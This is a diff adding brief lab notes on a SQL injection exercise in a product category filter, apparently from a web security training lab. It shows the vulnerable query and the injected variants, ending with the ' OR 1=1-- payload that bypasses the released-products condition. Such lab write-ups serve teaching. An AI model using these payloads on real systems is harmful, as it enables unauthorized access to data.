@@ -1,0 +1,20 @@
+SQL injection - product category filter
+
+SQL query -  SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+Goals: 
+1- display all products both released and unreleased.
+
+
+Analysis:
+
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+
+SELECT * FROM products WHERE category = ''' AND released = 1
+
+SELECT * FROM products WHERE category = ''--' AND released = 1
+
+SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
+
+
+Solved
